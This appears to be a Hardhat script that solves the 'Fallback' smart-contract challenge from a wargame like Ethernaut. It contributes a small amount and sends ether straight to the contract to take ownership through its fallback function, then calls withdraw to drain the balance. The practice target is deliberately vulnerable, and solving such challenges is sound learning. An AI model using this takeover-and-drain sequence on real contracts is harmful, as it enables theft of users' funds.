import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0x3063527AEE58c9470AD00E31e4fc6A613b84a8b1"
const PLAYER_ADDRESS = "0x8626f6940E2eb28930eFb4CeF49B2d1F2C9C1199"
async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS)

  const contract = await ethers.getContractAt("Fallback", CONTRACT_ADDRESS, signer)
  const owner = await contract.owner();
  console.log(owner);
  await contract.contribute({
    value: ethers.utils.parseEther("0.0005")
  })

  await signer.sendTransaction({
    to: CONTRACT_ADDRESS,
    value: ethers.utils.parseEther("0.0005")
  })

  await contract.withdraw()
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
